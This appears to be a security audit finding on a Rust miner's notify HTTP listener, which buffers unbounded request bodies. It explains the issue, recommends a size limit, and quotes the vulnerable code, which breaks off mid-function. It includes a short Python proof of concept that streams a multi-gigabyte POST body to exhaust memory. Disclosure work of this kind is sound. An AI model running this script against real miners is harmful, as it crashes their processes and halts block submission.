### Title
Unbounded HTTP Body Accumulation in Miner Notify Listener Enables Memory Exhaustion — (`miner/src/client.rs`)

### Summary

The miner's notify HTTP server unconditionally buffers the entire request body into memory before performing any size check or validation. Any peer that can reach the configured listen address can send an arbitrarily large POST body to exhaust the miner process's memory.

### Finding Description

When `config.listen` is `Some(addr)`, `spawn_background` calls `listen_block_template_notify`, which binds a `TcpListener` to the configured `SocketAddr` and dispatches every accepted connection to the `handle` function. [1](#0-0) 

The `handle` function immediately calls `BodyExt::collect(req).await?.aggregate()` with no preceding `Content-Length` check, no body-size cap, and no middleware limit: [2](#0-1) 

The collected bytes are held in memory until `serde_json::from_reader` either succeeds or fails. No guard exists anywhere in the miner crate: [3](#0-2) 

The `listen` field is a plain `Option<SocketAddr>` with no enforcement that it must be a loopback address: [4](#0-3) 

### Impact Explanation

A single TCP connection carrying a multi-gigabyte POST body will cause the miner process to allocate that many bytes before returning any response. Repeated or concurrent requests exhaust physical RAM and trigger an OOM kill, halting all block submission. This matches the stated scoped impact: **memory exhaustion of the miner process, causing an operational crash or OOM kill (Medium 2001–10000)**.

### Likelihood Explanation

- When `listen` is bound to a non-loopback address (e.g., `0.0.0.0:PORT`), any network peer can exploit this with a single HTTP request.
- Even when bound to `127.0.0.1`, any unprivileged local process on the same host can exploit it — no special privileges are required.
- There is no authentication, no rate limiting, and no connection cap on the listener. [5](#0-4) 

### Recommendation

Apply a body-size limit before collecting. With `hyper`/`http-body-util`, wrap the incoming body with a `Limited` adapter before calling `collect`:

```rust
use http_body_util::Limited;

const MAX_BODY: u64 = 4 * 1024 * 1024; // 4 MB, well above any real block template

async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let limited = Limited::new(req, MAX_BODY);
    let body = BodyExt::collect(limited).await?.aggregate();
    // ...
}
```

Additionally, consider binding the listener to `127.0.0.1` by default and documenting that exposing it on a public interface is unsupported.

### Proof of Concept

```bash
# Start miner with listen mode enabled on any reachable address
# Then from any host that can reach LISTEN_ADDR:
python3 -c "
import socket, time
s = socket.create_connection(('LISTEN_ADDR', PORT))
header = (
    b'POST / HTTP/1.1\r\n'
    b'Host: LISTEN_ADDR\r\n'
    b'Content-Type: application/json\r\n'
    b'Content-Length: 2000000000\r\n'
    b'\r\n'
)
s.send(header)
chunk = b'A' * 65536
while True:
    s.send(chunk)  # miner buffers all of this
"
# Observe miner RSS grow unboundedly until OOM kill
```

    async fn listen_block_template_notify(&self, addr: SocketAddr) {
        let listener = TcpListener::bind(addr).await.unwrap();
        let server = auto::Builder::new(TokioExecutor::new());
        let graceful = GracefulShutdown::new();
        let stop_rx: CancellationToken = new_tokio_exit_rx();

        loop {
            let client = self.clone();
            let handle = service_fn(move |req| handle(client.clone(), req));
            tokio::select! {
                conn = listener.accept() => {
                    let (stream, _) = match conn {
                        Ok(conn) => conn,
                        Err(e) => {
                            info!("accept error: {}", e);
                            tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                            continue;
                        }
                    };
                    let stream = hyper_util::rt::TokioIo::new(Box::pin(stream));
                    let conn = server.serve_connection_with_upgrades(stream, handle);

                    let conn = graceful.watch(conn.into_owned());
                    tokio::spawn(async move {
                        if let Err(err) = conn.await {
                            info!("connection error: {}", err);
                        }
                    });
                },
                _ = stop_rx.cancelled() => {
                    info!("Miner client received exit signal. Exit now");
                    break;
                }
            }
        }
        drop(listener);
